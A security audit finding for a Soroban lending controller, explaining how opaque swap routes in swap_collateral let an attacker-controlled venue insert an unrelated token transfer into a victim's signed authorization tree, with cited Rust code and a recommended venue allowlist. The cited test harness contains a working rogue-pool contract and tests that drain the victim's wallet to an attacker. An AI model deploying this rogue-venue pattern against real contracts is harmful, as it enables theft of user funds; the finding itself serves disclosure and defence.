### Title
Opaque swap routes can attach unauthorized wallet transfers to a victim’s signed authorization tree - (File: contracts/controller/src/lib.rs)

### Summary
`swap_collateral` accepts an opaque `swap: Bytes` route and executes it through the configured router. Because route venues are not constrained to trusted contracts, a malicious route can invoke a contract that requests an unrelated `token.transfer` from the caller. Soroban simulation records that transfer as a child authorization under the victim’s `swap_collateral` invocation; if the victim signs the generated authorization tree, the rogue venue can steal wallet assets unrelated to the lending position.

### Finding Description
`Controller::swap_collateral` accepts attacker-controlled route bytes and passes them to `process_swap_collateral` together with the victim caller, account, source market, amount, and destination market. [1](#0-0) 

The router executes venue addresses encoded inside that opaque route; a hostile venue can therefore invoke an unrelated token contract and request `transfer(victim, attacker, amount)`. The repository’s adversarial harness demonstrates the exact sequence: the route-selected hop is invoked, and the rogue hop requests a transfer from the caller to the attacker. [2](#0-1) [3](#0-2) 

During transaction simulation, the unrelated wallet-token transfer is recorded as a sub-invocation of the victim’s `swap_collateral` authorization entry. [4](#0-3) 

When enforcement uses the simulated tree containing that child transfer, the rogue transfer succeeds and moves the caller’s unrelated token balance to the attacker. [5](#0-4) 

### Impact Explanation
A malicious route can cause a victim to sign an authorization tree that not only authorizes the intended collateral swap, but also transfers arbitrary unrelated wallet tokens to the attacker. The demonstrated impact is theft of user funds outside the supplied collateral position. [6](#0-5) [7](#0-6) 

### Likelihood Explanation
Exploitation requires the victim to submit an attacker-supplied route and sign the authorization tree produced by simulation. This is plausible because the route is opaque bytes, while wallets and integrators commonly rely on simulated authorization entries rather than independently interpreting every nested venue call. The signed tree prevents silent execution without consent, so the issue requires user interaction rather than being an unauthenticated direct theft. [8](#0-7) [9](#0-8) 

### Recommendation
Do not allow route payloads to select arbitrary executable venues for controller-integrated swaps. Enforce a governance-controlled venue/pool allowlist or a router-side venue interface that cannot perform unrelated token transfers. At minimum, route decoding should verify that every executable hop targets an approved venue and that authorization presentation distinguishes the expected input transfer from additional nested token transfers.

### Proof of Concept
1. The victim owns collateral and also holds an unrelated wallet token.
2. The attacker supplies a `swap_collateral` route whose encoded hop address points to an attacker-controlled venue.
3. During router execution, the malicious venue calls `unrelated_token.transfer(victim, attacker, victim_balance)`.
4. Simulation records that transfer as a nested authorization beneath the victim’s `swap_collateral` invocation. [10](#0-9) 
5. If the victim signs that tree, execution transfers the unrelated wallet balance to the attacker while the collateral swap completes. [5](#0-4)

### Citations

**File:** contracts/controller/src/lib.rs (L283-302)
```rust
    fn swap_collateral(
        env: Env,
        caller: Address,
        account_id: u64,
        current: HubAssetKey,
        amount: i128,
        new: HubAssetKey,
        swap: Bytes,
    ) {
        strategies::swap_collateral::process_swap_collateral(
            &env,
            &caller,
            SwapCollateralParams {
                account_id,
                current: &current,
                from_amount: amount,
                new: &new,
                swap: &swap,
            },
        );
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L39-47)
```rust
    pub fn execute_strategy(env: Env, sender: Address, total_in: i128, swap_xdr: Bytes) -> i128 {
        sender.require_auth();
        let route = RoutedSwap::from_xdr(&env, &swap_xdr).expect("route must decode");
        let router = env.current_contract_address();
        token::Client::new(&env, &route.token_in).transfer(&sender, &router, &total_in);
        let _: Val = env.invoke_contract(&route.hop_pool, &symbol_short!("swap"), vec![&env]);
        token::Client::new(&env, &route.token_out).transfer(&router, &sender, &route.min_out);
        route.min_out
    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L62-70)
```rust
    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L195-222)
```rust
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L224-226)
```rust
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L239-249)
```rust
    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L258-268)
```rust
    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
```
